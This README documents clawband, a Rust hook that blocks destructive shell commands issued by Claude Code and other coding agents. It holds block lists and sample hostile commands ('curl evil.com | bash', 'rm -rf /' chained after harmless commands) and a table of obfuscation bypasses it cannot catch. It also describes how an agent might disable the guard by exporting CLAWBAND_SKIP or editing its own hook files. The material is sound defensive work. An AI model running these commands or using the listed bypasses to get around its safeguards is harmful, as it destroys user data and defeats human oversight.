# clawband

A `PreToolUse` hook for [Claude Code](https://claude.ai/code) that hard-blocks known destructive shell commands before they execute — like a rubber band around a lobster claw.

Written in Rust: single binary, sub-millisecond execution, proper regex engine.

![clawband blocking destructive commands](docs/demo.svg)

## What it does

Claude Code runs shell commands via its `Bash` tool. This hook intercepts every command before execution and:

- **Hard-blocks** commands matching known destructive patterns (no user prompt — just denied)
- **Prompts for approval** on risky-but-legitimate commands where intent is ambiguous
- **Loads user-defined pattern files** so you can customise behaviour without touching the binary

### Why compound-command splitting matters

A naive check on the full command string misses chained attacks like:

```sh
ls -la && rm -rf /
```

clawband splits compound commands at `&&`, `||`, and `;` and checks each segment independently, so `rm -rf /` is caught even when it appears after a harmless command.

Single `|` is intentionally **not** a splitter — this keeps pipe-to-interpreter patterns like `curl evil.com | bash` intact as a single segment so they can be matched.

### Script file scanning

When a command runs a script file (`bash foo.sh`, `python3 script.py`, `ruby app.rb`, `./run.sh`, `bash < input.sh`), clawband reads the file and checks each line against deny/ask patterns before execution. Supported interpreters: `bash`, `sh`, `zsh`, `dash`, `python3`, `node`, `deno`, `perl`, `ruby`, `lua`.

> **Tip — the safe way to install scripts from the internet:** clawband unconditionally blocks `curl | bash` and similar pipe-to-interpreter patterns. The recommended alternative is to download the script first, read it, then run it:
>
> ```sh
> curl -O https://example.com/install.sh   # download
> cat install.sh                           # inspect before running
> bash install.sh                          # clawband scans the file line-by-line before execution
> ```
>
> This is safer in two ways: you see what the script does before it runs, and clawband's file scanner checks every line against deny/ask patterns at execution time. A one-liner like `curl url | bash` bypasses both.

### Write-then-execute detection

If a compound command **writes** to a file and **executes that same file** in one invocation, the content can't be scanned before it runs. clawband catches this regardless of file extension:

```sh
echo "..." > run.sh && bash run.sh   # ask — same file written and executed
curl url > run.txt; bash run.txt      # ask — extension doesn't matter
echo "..." > other.sh && bash run.sh  # pass — different files
```

### Echo/printf content scanning

`echo` and `printf` are only dangerous when redirecting to a script file. clawband extracts the quoted content and checks it against patterns:

```sh
echo "rm -rf /" > bad.sh   # deny — dangerous content in script file
echo "hello" > log.txt     # pass — not a script file
echo "hello world"          # pass — no redirection
```

### Attribution

Every block or prompt message is prefixed with `[CLAWBAND]` so you can always tell the source — distinguishable from Claude Code's built-in deny list and Claude's own safety judgment, and prominent even where the message renders without colour.

## Installation

Requires `jq`. Rust is only needed if no pre-built binary is available for your platform.

```sh
bash install.sh
```

The installer downloads the latest pre-built binary for your platform (Linux x86_64, Linux arm64, macOS arm64, macOS x86_64) and falls back to `cargo build` if none is available. It installs the binary to `~/.claude/hooks/clawband`, creates `~/.clawband/` config files, and wires up `~/.claude/settings.json`. Then run `/hooks` in Claude Code (or restart) to activate.

### Homebrew

```sh
brew install jamessoubry/clawband/clawband
clawband install   # wires the hook into ~/.claude/settings.json + seeds config
clawband verify    # confirm it's active
```

Homebrew installs the `clawband` binary onto your `PATH` but does **not** wire it into Claude Code. `clawband install` does that step (creates `~/.clawband/` pattern files and registers the `PreToolUse` hook). Then run `/hooks` in Claude Code (or restart). Upgrade with `brew upgrade clawband`.

### Manual installation

```sh
cargo build --release
mkdir -p ~/.claude/hooks
cp target/release/clawband ~/.claude/hooks/clawband
chmod +x ~/.claude/hooks/clawband
```

Add to `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{"type": "command", "command": "~/.claude/hooks/clawband"}]
      }
    ]
  }
}
```

### Upgrading

```sh
clawband upgrade          # fetch the latest release and replace the running binary in place
clawband upgrade --check  # report whether an update is available (no download)
```

`upgrade` queries the latest GitHub release, downloads the matching platform asset (Linux x86_64/arm64, macOS arm64/x86_64), verifies it, backs up the old binary, and atomically swaps `clawband` wherever it's installed (e.g. `~/.claude/hooks/clawband`). The new version is live on the next hook invocation — no restart. If clawband was installed via Homebrew, `upgrade` defers to `brew upgrade clawband` instead.

## Built-in patterns

### Blocked (deny)

| Category | Examples |
|----------|---------|
| File system destruction | `rm -rf /`, `rm -rf ~`, `sudo rm -rf`, `mkfs`, `dd if=`, `dd of=` |
| Silent file emptying | `truncate -s 0` |
| Infrastructure destruction | `terraform destroy`, `terragrunt destroy`, `kubectl delete namespace` |
| AWS destructive ops | `aws rds delete-db-instance`, `aws eks delete-cluster`, `aws s3 rm --recursive`, `aws cloudformation delete-stack`, `aws lambda delete-function` |
| Database destruction | `dropdb` |
| Docker destruction | `docker system prune` |
| Pipe to interpreter | `\| bash`, `\| sh`, `\| python`, `\| node`, `\| ruby`, `\| perl` (with or without space) |
| Pipe to interpreter via sudo | `\| sudo bash`, `\| sudo python`, etc. |
| Heredoc to interpreter | `bash <<`, `python <<`, etc. |
| Pipe to database CLI | `\| psql`, `\| mysql`, `\| sqlite3` |
| Pipe to system tools | `\| patch`, `\| crontab`, `\| at` |
| find / xargs escalation | `find ... -delete`, `-exec bash`, `-exec rm`, `xargs sh`, `xargs python`, etc. |
| git force push | `git push --force` / `-f` (allows `--force-with-lease`) |
| kill -1 (all processes) | `kill -9 -1`, `kill -- -1`, `kill -s KILL -1`, `kill -SIGKILL -1` — sends a signal to PID `-1`, which targets every process the user can signal |
| pkill/killall -u (all of a user's processes) | `pkill -u $USER`, `killall -u jsoubry` — terminates every process owned by the specified user |
| killall5 | `killall5` — kills all processes regardless of owner (used in shutdown sequences) |

### Prompted (ask)

| Category | Examples |
|----------|---------|
| eval | `eval ` — common in shell init but executes arbitrary strings |
| Destructive git (local) | `git reset --hard`, `git checkout -- `, `git stash drop`, `git stash clear` |
| git clean | `git clean -f`, `git clean -x`, `git clean -d` — wipes untracked files irreversibly |
| Remote branch deletion | `git push --delete` |
| git restore (working tree) | `git restore <path>` — discards uncommitted changes (`git restore --staged` is safe and not prompted) |
| git branch -D | `git branch -D <branch>` — force-deletes branch regardless of merge status |
| docker rm -f | `docker rm -f`, `docker container rm -f` — force-removes running containers |
| npx / npm exec | `npx pkg`, `npm exec -- cmd` — downloads and executes arbitrary npm packages, content can't be scanned |
| git push :<branch> | `git push origin :branch` — colon-prefix syntax for remote branch deletion |
| base64 decode | `base64 -d`, `base64 --decode` piped or redirected — decoding obfuscated content is an anti-inspection vector |
| xxd reverse | `xxd -r` piped or redirected — hex-decode used to smuggle binary payloads |
| openssl decode | `openssl base64 -d`, `openssl enc -d` — SSL-tool decoding to evade text scanning |
| killall \<name\> | `killall node`, `killall python3` — kills every process matching a name; broad but often legitimate |
| pkill \<pattern\> | `pkill python`, `pkill -f someserver` — kills every process matching a name or pattern |

### Safe patterns preserved

- `| python3 -c "..."` — visible inline code is allowed (not a supply-chain risk)
- `| python3 -m module` — module invocation is allowed
- `--force-with-lease` — safe alternative to force push
- `find . -exec cmd {} \;` — the `\;` terminator is not treated as a command separator
- `kill <pid>`, `kill -9 <pid>`, `kill -1 <pid>` — plain kill with a specific PID is always allowed; `-1` is only blocked when it appears as the final (target) argument with no PID following it

## Custom patterns

Extend or override behaviour by editing pattern files. clawband loads two sets:

**Global** (`~/.clawband/`) — applied to every project:

| File | Effect |
|------|--------|
| `deny.patterns` | Always block — added to built-in deny list |
| `ask.patterns` | Always prompt — added to built-in ask list |
| `allow.patterns` | Override any block, and emit an explicit `allow` (see below) |

### How `allow.patterns` works

When a **whole command** matches an `allow.patterns` entry, clawband returns an explicit `permissionDecision: "allow"`. This does two things: it skips clawband's own deny/ask checks, **and** it tells Claude Code to skip its *native* permission check too — so an allow-listed command won't trigger Claude Code's built-in prompts either (handy for working around false positives in its compound-command checker). A single allow-listed *segment* of a compound command does not green-light the whole command — the explicit allow only fires on a full-command match.

> **Anchor your allow patterns.** Patterns are unanchored substring regexes by default. `allow "git push"` also allows `git push --force` because the pattern appears as a substring. Use `^` and `$` to be precise: `^git push origin main$`.

### Default decision — make clawband the sole gatekeeper

By default, a command that matches **no** pattern falls through to Claude Code's native permission system, which prompts generically for anything not in its own allow list. Set a `default_decision` in `~/.clawband/config` to change that:

```toml
# ~/.clawband/config
default_decision = passthrough   # (default) let Claude Code's native check handle unmatched commands
# default_decision = allow       # emit `allow` for unmatched commands — clawband becomes the sole gatekeeper
# default_decision = ask         # review everything not explicitly allowed
```

With `default_decision = allow`, only your `deny`/`ask` patterns stop or prompt; everything else runs with no native prompt. This is what makes clawband useful **without** `bypassPermissions` mode: instead of Claude Code asking about every command, clawband silently allows the safe ones, **prompts** on `ask`-tier commands (e.g. `git reset --hard`, so you approve it only when it's a safe moment), and **hard-blocks** the dangerous ones.

> Mode note: a hook `ask` decision only produces a prompt when you are **not** in `bypassPermissions`/YOLO mode. In YOLO mode an `ask` runs without prompting, so `default_decision = ask` and the `ask` tier only gate when bypass mode is off. A project-level `.clawband/config` overrides the global one.

**Project** (`.clawband/` in the current working directory) — loaded in addition to global patterns when the directory exists. Useful for per-repo restrictions or allowances without affecting other projects:

| File | Effect |
|------|--------|
| `.clawband/deny.patterns` | Project-specific blocks — auto-loaded |
| `.clawband/ask.patterns` | Project-specific prompts — auto-loaded |
| `.clawband/allow.patterns` | Project-specific overrides — **requires `clawband trust`** |

Each file is one **case-insensitive regex** per line. Lines starting with `#` and blank lines are ignored.

See `deny.patterns.example` and `ask.patterns.example` for the format.

```sh
# ~/.clawband/deny.patterns — global blocks for all projects
my-infra nuke --all

# .clawband/allow.patterns — project-specific override (requires clawband trust)
git reset --hard HEAD$
```

### Why project allow.patterns requires trust

Project `deny.patterns` and `ask.patterns` auto-load without any prompt — a repo tightening its own rules can only make clawband *stricter*, which is safe. Project `allow.patterns` is different: a single `.*` entry would suppress all deny and ask checks for every command the agent runs in that directory.

This is a supply-chain vector. An attacker commits `.clawband/allow.patterns` containing `.*`, a developer clones the repo and runs an AI agent, and clawband silently stands down for the entire session.

To prevent this, project `allow.patterns` requires explicit opt-in:

```sh
clawband trust                          # trust .clawband/allow.patterns in the current directory
clawband trust /path/to/allow.patterns  # trust a specific file
```

This records the file's path and a content hash in `~/.clawband/trusted`. If the file is later modified (e.g. an upstream commit changes the patterns), the hash no longer matches and clawband warns again — so trust is scoped to the exact content you reviewed, not the file path forever.

Until trusted, clawband loads project deny/ask patterns normally but ignores project allow patterns and prints a warning to stderr:

```
[CLAWBAND] Project allow.patterns found but not trusted: /path/.clawband/allow.patterns
  Run `clawband trust` to enable it.
```

## Self-protection

By default clawband guards Claude's **Bash** tool. With `--protect` it also guards Claude's **Write/Edit** tools, preventing the model from modifying clawband itself or any other path you list.

```sh
clawband install --protect
```

This does three things:

1. **Registers a second `PreToolUse` hook** with matcher `Write|Edit|MultiEdit|NotebookEdit`. Every file-edit attempt goes through clawband before it executes. The guard resolves symlinks (via `std::fs::canonicalize`) so a symlinked path cannot bypass protection.
2. **Seeds `~/.clawband/protect.paths`** (if missing) with default protected paths:
   - `~/.claude/settings.json` — Claude Code's settings (where hooks are registered)
   - `~/.claude/hooks/clawband` — the clawband binary itself
   - `~/.clawband/*` — all clawband config files
   - shell startup files (`~/.bashrc`, `~/.bash_profile`, `~/.profile`, `~/.zshrc`, `~/.zprofile`, `~/.zshenv`) — so Claude can't export `CLAWBAND_SKIP=1` (or remove the hook) by editing them
3. **Extends the Bash deny patterns** (when protect.paths is present) to block shell tamper commands: `rm`/`mv`/`shred` referencing clawband files, output redirection (`>`/`>>`) to those files, `sed -i` or `tee` targeting `settings.json`, and `chmod -x` on the hook binary.

### What is still allowed

- **Your own terminal** is completely unaffected — clawband hooks only fire on Claude Code's tools, never on commands you type yourself.
- `brew upgrade clawband`, `brew install ... clawband`, `clawband install`, `bash install.sh` all pass unimpeded.
- Any Bash command that does not reference the protected file paths is unchanged.

### Customising protect.paths

`~/.clawband/protect.paths` is one case-insensitive regex per line. Lines starting with `#` and blank lines are ignored. A leading `~/` is expanded to your home directory at load time.

```
# ~/.clawband/protect.paths
~/.claude/settings\.json$
~/.claude/hooks/clawband$
~/.clawband/.*
# protect a project's production secrets too
/etc/myapp/prod\.env$
```

A project-level `.clawband/protect.paths` (in the current working directory) is loaded in addition to the global file.

`clawband verify` reports whether self-protect is active (both protect.paths present and the Write/Edit hook registered).

## CLI commands

```sh
clawband install                      # wire the hook into ~/.claude/settings.json + seed config
clawband install --protect            # also enable self-protect (guard clawband files from edits)
clawband install --post               # also wire the PostToolUse companion (suggests allow after a prompt)
clawband verify                       # check the hook is registered and the engine works
clawband allow '<pattern>'            # append to ~/.clawband/allow.patterns (global)
clawband allow --project '<pattern>'  # append to .clawband/allow.patterns (project CWD)
clawband deny  '<pattern>'            # append to ~/.clawband/deny.patterns (global)
clawband deny  --project '<pattern>'  # append to .clawband/deny.patterns (project CWD)
clawband trust                        # trust .clawband/allow.patterns in CWD (records content hash)
clawband trust <path>                 # trust a specific allow.patterns file
clawband stats                        # show pattern counts and audit log summary
clawband test '<command>'             # dry-run: print DENY/ASK/PASS without executing
clawband patterns                     # list all active patterns (built-in + user + project)
clawband log                          # view the audit log (--enable, -n N, --clear, --path)
clawband uninstall                    # remove clawband hooks from settings
clawband --version
```

`clawband test` is useful when authoring custom patterns or debugging false positives. It loads the same pattern set the live hook uses (built-in + global + project + self-protect patterns) and prints a coloured `DENY`, `ASK`, or `PASS` result with the matching reason.

`clawband patterns` prints all currently-active patterns grouped by source — built-in deny, built-in ask, user deny/ask/allow, project deny/ask/allow, and self-protect paths — so you can audit exactly what the running hook enforces.

`clawband log` shows the audit trail of past decisions. Turn logging on with `clawband log --enable` (writes a marker so it persists without setting `CLAWBAND_LOG=1`); then `clawband log` prints recent deny/ask/skip events (newest last, coloured), `clawband log -n 100` shows more, `clawband log --clear` truncates it, and `clawband log --path` prints the log file location.

`clawband install` is idempotent — it won't duplicate the hook if it's already registered, and it preserves any other hooks (icm, sqz, etc.) already in your settings. `clawband verify` runs a self-test that feeds a known-destructive command through the engine to confirm it actually blocks, and exits non-zero if anything is misconfigured (handy in CI or a dotfiles bootstrap).

Patterns are validated as regexes before writing. The install script also adds `/allow` and `/deny` Claude Code slash commands so you can add patterns without leaving the chat.

## PostToolUse hook (optional)

Install with `--post` to enable in-chat allow suggestions:

```sh
clawband install --post   # binary
bash install.sh --post-hook  # install script (flag name differs)
```

When you approve a prompted command, the hook tells Claude the command ran and suggests the exact `clawband allow` command to permanently silence that prompt. Uses a breadcrumb file (`~/.clawband/.last-ask`) written at prompt time and consumed on approval — if you deny, PostToolUse never fires and the breadcrumb expires after 60 seconds.

## Options

Set as environment variables (in your shell profile, or prefixed on the hook command):

| Variable | Default | Effect |
|----------|---------|--------|
| `RTK_ENABLED` | `0` | Strip `rtk` prefix before matching ([RTK](https://github.com/rtk-ai/rtk) users) |
| `SQZ_ENABLED` | `0` | Strip `sqz compress` suffix before matching ([sqz](https://github.com/ojuschugh1/sqz) users) |
| `CLAWBAND_LOG` | `0` | Append every block/prompt to `~/.clawband.log` |
| `CLAWBAND_SKIP` | `0` | **Total bypass** — disables *all* checks (see below) |

### About `CLAWBAND_SKIP`

`CLAWBAND_SKIP=1` is a complete bypass: clawband exits immediately and the command runs with no checks at all — deny patterns included. It does **not** downgrade blocks to prompts; it skips everything.

Crucially, clawband reads this variable from **its own process environment**, *not* from the command string. That means a model cannot bypass the guard by prefixing a command:

```sh
CLAWBAND_SKIP=1 rm -rf /     # STILL BLOCKED — the prefix is just text in the
                             # command string; rm -rf / still matches
```

The variable only takes effect when it is actually exported into the hook's environment. The safe, intended use is a one-off inline prefix on a **trusted wrapper you invoke yourself**, where it applies to that single invocation.

⚠️ **Footgun:** if you `export CLAWBAND_SKIP=1` globally (shell profile or Claude Code `settings.json` `env` block), clawband is silently disabled for the entire session. `clawband stats` shows a red **ALL CHECKS DISABLED** warning when it detects this, and (with `CLAWBAND_LOG=1`) every bypassed command is recorded as a `SKIP` event in `~/.clawband.log`.

## Using clawband with other agents (Codex, Gemini, Hermes, OpenClaw, OpenCode)

The same core engine — deny/ask/allow tiers, script scanning, protect-paths — works with Codex CLI, Gemini CLI, Hermes Agent, OpenClaw, and OpenCode. Only the output JSON format and the install wiring differ per agent.

### Mode selection

Mode is resolved in priority order:

1. `--mode <claude|codex|gemini|hermes|openclaw|opencode>` CLI flag passed directly to the binary
2. `CLAWBAND_MODE=<mode>` environment variable
3. `mode = <value>` line in `~/.clawband/config`
4. Default: `claude` (existing behaviour, byte-identical)

### Installing for a specific agent

```sh
clawband install --mode codex     # wires ~/.codex/config.toml
clawband install --mode gemini    # wires ~/.gemini/settings.json
clawband install --mode hermes    # wires ~/.hermes/config.yaml
clawband install --mode openclaw  # seeds ~/.clawband/ + prints plugin install steps
clawband install --mode opencode  # seeds ~/.clawband/ + prints plugin install steps
clawband install                  # Claude Code (default, unchanged)
```

Each command:
- seeds the same `~/.clawband/` pattern files as a normal Claude install
- writes the agent-specific hook config (or prints manual steps for plugin-based agents)
- prints the exact snippet added so you can verify or add it manually

### Output format per agent

| Agent | Deny | Ask | Allow | Pass (no match) |
|-------|------|-----|-------|-----------------|
| Claude | `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"[CLAWBAND]\n..."}}` | same with `"ask"` | same with `"allow"` | no output |
| Codex | same JSON shape as Claude | folded via `ask_fallback` | same | no output |
| Gemini | `{"decision":"block","reason":"[CLAWBAND]\n..."}` | folded via `ask_fallback` | `{"decision":"allow"}` | no output |
| Hermes | `{"decision":"block","reason":"[CLAWBAND]\n..."}` | folded via `ask_fallback` | `{}` | no output |
| Openclaw | `{"decision":"block","reason":"[CLAWBAND]\n..."}` | `{"decision":"ask","reason":"..."}` → `requireApproval` | `{"decision":"allow"}` | no output |
| OpenCode | `{"decision":"block","reason":"[CLAWBAND]\n..."}` | folded via `ask_fallback` | `{}` | no output |

All reason strings carry the `[CLAWBAND]` prefix regardless of mode.

### The `ask` tier in non-Claude modes

Claude's PreToolUse can prompt the user interactively ("ask"). Codex, Gemini, Hermes, and OpenCode have no equivalent native approval path. When the engine decides "ask" and mode is not `claude` or `openclaw`, clawband applies `ask_fallback`:

- `ask_fallback = allow` (default) — renders as allow (passes the command through). The ask tier is meant to *confirm*, not *forbid*; on agents that can't prompt, hard-blocking it would be surprising. Your hard **deny** patterns still block.
- `ask_fallback = deny` — renders as a hard deny with the reason:  
  `[CLAWBAND]\nmanual-approval required (ask tier) — blocked under <mode> (set ask_fallback=allow to permit). Original: …`

Set it in `~/.clawband/config`:

```
ask_fallback = deny
```

**OpenClaw exception** — OpenClaw is the only non-Claude agent with a native
approval prompt. The plugin shim maps `ask` decisions to `requireApproval`,
giving the user a real choice. `ask_fallback` has no effect in Openclaw mode.

### OpenClaw

OpenClaw uses an in-process **TypeScript plugin** instead of a config-file
hook, so the wiring differs from Codex/Gemini/Hermes.

```sh
clawband install --mode openclaw   # seeds ~/.clawband/ + prints install steps
```

The plugin shim lives in [`integrations/openclaw/`](integrations/openclaw/).
Install it with:

```sh
openclaw plugins install <path-to-clawband>/integrations/openclaw/
# or, once published to ClawHub:
openclaw plugins install clawband
```

See [`integrations/openclaw/README.md`](integrations/openclaw/README.md) for
full details, prerequisites, and the `CLAWBAND_BIN` override.

### OpenCode

OpenCode (sst/opencode) uses an in-process **JS plugin** via its
`tool.execute.before` hook. The wiring differs from config-file agents.

```sh
clawband install --mode opencode   # seeds ~/.clawband/ + prints plugin install steps
```

The plugin lives in [`integrations/opencode/`](integrations/opencode/).
Copy it to OpenCode's plugin directory:

```sh
# Global (all projects):
cp integrations/opencode/clawband.js ~/.config/opencode/plugin/

# Project-local:
cp integrations/opencode/clawband.js .opencode/plugin/

# Or register via opencode.json:
# { "plugin": ["<path>/integrations/opencode/clawband.js"] }
```

Ask-tier commands fold via `ask_fallback` (default: allow). Set
`ask_fallback = deny` in `~/.clawband/config` to hard-block ask-tier commands.

**Known limitation** — OpenCode plugin hooks do not intercept subagent tool
calls ([sst/opencode#5894](https://github.com/sst/opencode/issues/5894)).
This is an upstream limitation.

| Agent | Deny | Ask | Allow | Pass (no match) |
|-------|------|-----|-------|-----------------|
| OpenCode | `{"decision":"block","reason":"[CLAWBAND] ..."}` → plugin throws | folded via `ask_fallback` | `{}` → plugin returns | no output |

See [`integrations/opencode/README.md`](integrations/opencode/README.md) for
full details, prerequisites, and the `CLAWBAND_BIN` override.

## Requirements

- `bash install.sh`: `jq` (always), Rust toolchain (`cargo`) only if no pre-built binary is available for your platform
- Runtime: none (single static binary)

## Troubleshooting

**Command silently blocked with no clawband output?**

Claude Code evaluates permissions in this order:

1. **Claude Code's built-in deny list** (`settings.json → permissions.deny`) — blocks immediately; clawband's hook never fires
2. **clawband PreToolUse hook** — deny blocks, ask prompts, allow passes
3. **Claude Code's built-in allow list** (`settings.json → permissions.allow`) — allows without prompting

If a command is being silently blocked and clawband shows nothing, check your Claude Code deny list first:

```bash
cat ~/.claude/settings.json | jq '.permissions.deny'
```

Removing the entry from that list lets clawband's ask/deny patterns take over as intended.

## Limitations

- **Subshells are prompted, not blocked** — `$(...)` and backtick expressions embed commands that can't be safely split. The hook asks for confirmation rather than hard-blocking.
- **Obfuscated commands** — base64-encoded payloads or variable expansion bypass pattern matching. This is a first line of defence, not a sandbox.
- **No environment variable inspection** — `MY_CMD=rm; $MY_CMD -rf /` is not caught.
- **Force-push gaps** — `git push :<branch>` (colon-prefix deletion) and `git push origin +main` (plus-refspec force) are not blocked by the force-push pattern; use `--delete` / `--force-with-lease` instead.
- **Commit messages containing blocked patterns** — if a commit message itself contains a pattern like `rm -rf /` (e.g. documenting a fix), clawband will block the `git commit` command. Workaround: write the message to a temp file and use `git commit -F /tmp/msg.txt`, or rephrase to avoid the literal pattern.
- **Fail-closed on parse error** — if clawband cannot read or parse the hook input (stdin read failure, malformed JSON), it emits `deny` and blocks the command. It does **not** fail-open.

### Known shell obfuscation bypasses (issue #129)

clawband performs static string matching without running a shell interpreter, so techniques that require shell evaluation to resolve are out of scope. The following bypass classes are documented here for transparency:

| Technique | Example | Status |
|-----------|---------|--------|
| Brace expansion | `{rm,-rf,/}` | Out of scope — requires shell to resolve |
| ANSI-C hex quoting | `$'\x72\x6d' -rf /` | Out of scope — requires shell to resolve |
| ANSI-C octal quoting | `$'\162\155' -rf /` | Out of scope — requires shell to resolve |
| Glob in binary path | `/bin/r? -rf /` | Out of scope — requires shell to resolve |
| Bracket glob | `/bin/r[m] -rf /` | Out of scope — requires shell to resolve |
| Empty-quote splitting | `r""m -rf /`, `r''m -rf /` | **Normalized and caught** |
| Backslash in command word | `r\m -rf /` | **Normalized and caught** |

The inline-quote and backslash forms (`r""m`, `r''m`, `r\m`) are handled by a first-token normalization pass that strips empty quote pairs and unescaped backslashes before pattern matching, reducing these to their effective command name (e.g. `rm`).

Brace expansion, ANSI-C quoting, and glob expansion require actual shell execution to resolve and cannot be detected reliably without running the command. These are treated as out-of-scope for a static hook.

## Contributing

Found a destructive command clawband misses? Open a [New pattern issue](https://github.com/jamessoubry/clawband/issues/new?template=new-pattern.md) (no Rust needed) or add it yourself — patterns live in `src/main.rs` in `builtin_deny()` and `builtin_ask()`. See [CONTRIBUTING.md](CONTRIBUTING.md) for the pattern recipe, guidelines, and dev setup.

## Licence

MIT
